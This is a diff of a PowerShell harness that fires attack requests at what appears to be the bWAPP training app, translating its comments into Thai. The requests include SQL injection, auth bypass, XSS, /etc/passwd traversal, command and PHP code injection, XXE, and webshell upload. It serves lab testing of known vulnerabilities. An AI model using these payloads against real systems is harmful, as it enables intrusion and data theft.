@@ -1,10 +1,10 @@
-<#
-    validate.ps1 - batch-fires the payloads used in http/*.http and prints a verdict
-    per case. Run this to prove every request in the .http files actually works.
+﻿<#
+    validate.ps1 - ยิงคำขอทั้งชุดที่ใช้ใน http/*.http แล้วพิมพ์ผลตัดสินแยกเป็นรายเคส
+    เรียกใช้เพื่อพิสูจน์ว่าคำขอทุกรายการในไฟล์ .http ทำงานได้จริง
 
     .\scripts\validate.ps1
-    .\scripts\validate.ps1 -SecurityLevel 1   # re-run to show the WAF blunts some payloads
-    .\scripts\validate.ps1 -SaveEvidence     # dump every response body to evidence/
+    .\scripts\validate.ps1 -SecurityLevel 1   # รันซ้ำเพื่อดูว่า WAF ลดทอน payload ไปบ้าง
+    .\scripts\validate.ps1 -SaveEvidence     # บันทึก body ของทุก response ลง evidence/
 #>
 [CmdletBinding()]
 param(
@@ -14,6 +14,11 @@ param(
 )
 
 $ErrorActionPreference = 'Continue'
+
+# PowerShell 5.1 writes to the console using the OEM code page, so Thai text in
+# these messages turns into mojibake unless the console is switched to UTF-8.
+try { [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 } catch { }
+
 $Base = $BaseUrl.TrimEnd('/')
 $EvidenceDir = Join-Path (Split-Path $PSScriptRoot -Parent) 'evidence'
 $results = New-Object System.Collections.ArrayList
@@ -141,12 +146,12 @@ function Add-Case {
     }
 
     $ok = $true; $why = ''
-    if ($status -ne $ExpectStatus) { $ok = $false; $why = "status=$status (want $ExpectStatus)" }
-    if ($ok -and $LookFor -and $html -notmatch [regex]::Escape($LookFor)) { $ok = $false; $why = "missing: '$LookFor'" }
-    if ($ok -and $LookForNot -and $html -match [regex]::Escape($LookForNot)) { $ok = $false; $why = "present (should not be): '$LookForNot'" }
+    if ($status -ne $ExpectStatus) { $ok = $false; $why = "status=$status (ต้องการ $ExpectStatus)" }
+    if ($ok -and $LookFor -and $html -notmatch [regex]::Escape($LookFor)) { $ok = $false; $why = "ไม่พบ: '$LookFor'" }
+    if ($ok -and $LookForNot -and $html -match [regex]::Escape($LookForNot)) { $ok = $false; $why = "พบแล้ว (ไม่ควรพบ): '$LookForNot'" }
     if ($ok -and $LocationFor) {
         $loc = if ($r -and $r.Headers) { $r.Headers['Location'] } else { '' }
-        if ("$loc" -notmatch [regex]::Escape($LocationFor)) { $ok = $false; $why = "Location='$loc' (want '$LocationFor')" }
+        if ("$loc" -notmatch [regex]::Escape($LocationFor)) { $ok = $false; $why = "Location='$loc' (ต้องการ '$LocationFor')" }
     }
     if (-not $why) { $why = "status=$status len=$($html.Length)" }
 
@@ -160,7 +165,7 @@ function Add-Case {
 
 $HASH = '6885858486f31043e5839c735d99457f045affd0'
 
-# ================================================================ A1 Injection
+# ================================================================ A1 Injection - การฉีดโค้ด/คำสั่ง
 Add-Case -Id 'SQLI-01' -Name 'SQLi GET/search - boolean OR 1=1 dumps all movies' -Page 'sqli_1.php' `
     -Params @{ title = "' OR 1=1-- -"; action = 'go' } -LookFor 'World War Z'
 Add-Case -Id 'SQLI-02' -Name 'SQLi GET/search - UNION column count = 6' -Page 'sqli_1.php' `
@@ -189,7 +194,7 @@ Add-Case -Id 'SQLI-13' -Name 'SQLi error-based - enumerate tables' -Page 'sqli_2
     -Params @{ movie = "0 UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -"; action = 'go' } `
     -LookFor 'movies'
 
-# ================================================================ A2 XSS
+# ================================================================ A2 XSS - สแกรตสคริปต์ข้ามไซต์
 Add-Case -Id 'XSS-01' -Name 'Reflected XSS (GET) - firstname' -Page 'xss_get.php' `
     -Params @{ firstname = '<script>alert(1)</script>'; lastname = 'x' } -LookFor '<script>alert(1)</script>'
 Add-Case -Id 'XSS-02' -Name 'Reflected XSS (POST)' -Page 'xss_post.php' -Method POST `
@@ -216,7 +221,7 @@ Add-Case -Id 'XSS-11' -Name 'XSS via eval("document.write(...)") sink (xss_eval)
 Add-Case -Id 'XSS-12' -Name 'Stored XSS - user profile 2nd order (user_extra.php)' -Page 'user_extra.php' -Method POST `
     -Params @{ firstname = '<script>alert("stored2")</script>'; lastname = 'x'; form = 'submit'; action = 'add' } -LookForNot 'Failed'
 
-# ================================================================ A3 LFI / source disclosure
+# ================================================================ A3 LFI / source disclosure - LFI / การเปิดเผยซอร์สโค้ด
 Add-Case -Id 'LFI-01' -Name 'Arbitrary local file read - /etc/passwd' -Page 'directory_traversal_1.php' `
     -Params @{ page = '../../../../../../../etc/passwd' } -LookFor 'root:x:0:0'
 Add-Case -Id 'LFI-02' -Name 'Arbitrary local file read - /etc/hostname' -Page 'directory_traversal_1.php' `
@@ -229,7 +234,7 @@ Add-Case -Id 'LFI-05' -Name 'phpinfo() full page disclosure' -Page 'phpinfo.php'
 Add-Case -Id 'LFI-06' -Name 'Hardcoded DB creds readable via traversal' -Page 'directory_traversal_1.php' `
     -Params @{ page = 'admin/settings.php' } -LookFor 'db_password'
 
-# ================================================================ A4 Command / code exec
+# ================================================================ A4 Command / code exec - การรันคำสั่ง/โค้ด
 Add-Case -Id 'CMDI-01' -Name 'OS command injection - ; id' -Page 'commandi.php' -Method POST `
     -Params @{ target = '127.0.0.1; id'; form = 'submit' } -LookFor 'uid='
 Add-Case -Id 'CMDI-02' -Name 'OS command injection - pipe + && chain' -Page 'commandi.php' -Method POST `
@@ -243,12 +248,12 @@ Add-Case -Id 'CMDI-05' -Name 'Blind command injection - ping sink (sleep 3)' -Pa
 Add-Case -Id 'CMDI-06' -Name 'PHP code injection via eval($_REQUEST) - system("id")' -Page 'php_eval.php' -Method POST `
     -Params @{ eval = 'system("id");' } -LookFor 'uid='
 
-# ================================================================ A5 XXE / mail / upload
-# NOTE on XXE: this image ships PHP 5.5 + libxml 2.9.1, where external entity
-# resolution is disabled by default, so classic file-read via <!ENTITY> does NOT
-# fire here. The endpoint is still critically broken: it feeds attacker XML into
-# an unescaped SQL UPDATE, and it exposes internal HTTP via the entity channel on
-# builds where entity loading is re-enabled. Both are asserted below.
+# ================================================================ A5 XXE / mail / upload - XXE / อีเมล / อัปโหลดไฟล์
+# หมายเหตุเรื่อง XXE: image นี้ใช้ PHP 5.5 + libxml 2.9.1 ซึ่งปิดการ resolve
+# external entity ไว้เป็นค่าเริ่มต้น การอ่านไฟล์ด้วยวิธีคลาสสิกผ่าน <!ENTITY>
+# จึงไม่ทำงานที่นี่ แต่ endpoint นี้ยังเสียหายอย่างร้ายแรง: มันป้อน XML ที่ผู้โจมตี
+# ควบคุมเข้าไปใน SQL UPDATE ที่ไม่ได้ escape และเปิด HTTP ภายในออกมาทางช่องทาง
+# entity ได้ บน build ที่เปิดการโหลด entity กลับมา ทั้งสองกรณีถูกยืนยันด้านล่าง
 Add-Case -Id 'XXE-01' -Name 'XXE external entity file read (blocked by libxml 2.9 default)' -Page 'xxe-2.php' -Method POST `
     -ContentType 'text/xml' `
     -Body '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><reset><login>&x;</login><secret>s</secret></reset>' `
@@ -274,7 +279,7 @@ Add-Case -Id 'UPL-01' -Name 'Unrestricted upload - drop shell.php into images/' 
 Add-Case -Id 'UPL-02' -Name 'RCE via uploaded webshell - images/shell.php?c=id' -Page 'images/shell.php' `
     -Params @{ c = 'id' } -LookFor 'uid=33(www-data)'
 
-# ================================================================ A6 Auth / session
+# ================================================================ A6 Auth / session - การยืนยันตัวตน / session
 Add-Case -Id 'AUTH-01' -Name 'Insecure login #1 - classic SQLi auth bypass' -Page 'ba_insecure_login_1.php' -Method POST `
     -Params @{ login = "admin' OR '1'='1' #"; password = 'x'; form = 'submit' } -LookFor 'Welcome'
 Add-Case -Id 'AUTH-02' -Name 'Insecure login #2 - client-side-only password check' -Page 'ba_insecure_login_2.php' -Method POST `
@@ -295,7 +300,7 @@ Add-Case -Id 'AUTH-09' -Name 'LDAP injection auth bypass (wildcard)' -Page 'ldap
 Add-Case -Id 'AUTH-10' -Name 'Weak password policy page accepts trivial password' -Page 'ba_weak_pwd.php' -Method POST `
     -Params @{ login = 'bee'; password = '1'; form = 'submit' } -LookForNot 'Error'
 
-# ================================================================ A7 CSRF / clickjacking / CORS
+# ================================================================ A7 CSRF / clickjacking / CORS - ปลอมคำขอข้ามไซต์ / หลอกคลิก / ข้ามโดเมน
 Add-Case -Id 'CSRF-01' -Name 'CSRF - password change, no token' -Page 'csrf_1.php' -Method POST `
     -Params @{ password = 'pwned'; password_conf = 'pwned'; form = 'submit' } -LookFor 'Password'
 Add-Case -Id 'CSRF-02' -Name 'CSRF - privileged user creation, no token' -Page 'csrf_2.php' -Method POST `
@@ -309,7 +314,7 @@ Add-Case -Id 'CORS-02' -Name 'CORS origin allow-list bypass (secret-cors-2)' -Pa
     -Headers @{ Origin = 'http://intranet.itsecgames.com' } -LookFor "Wolverine's secret"
 Add-Case -Id 'CORS-03' -Name 'CORS control - secret-cors-3 leaks secret without CORS headers' -Page 'secret-cors-3.php' -LookFor "Johnny's secret"
 
-# ================================================================ A8 Info disclosure / misc
+# ================================================================ A8 Info disclosure / misc - การเปิดเผยข้อมูล / อื่นๆ
 Add-Case -Id 'INFO-01' -Name 'Unauthenticated /admin/ leaks credentials + SMTP config' -Page 'admin/' -LookFor 'bee/bug'
 Add-Case -Id 'INFO-02' -Name 'robots.txt disclosure' -Page 'robots.txt' -LookForNot 'Not Found'
 Add-Case -Id 'INFO-03' -Name 'Directory listing enabled at /images/' -Page 'images/' -LookFor 'Index of'
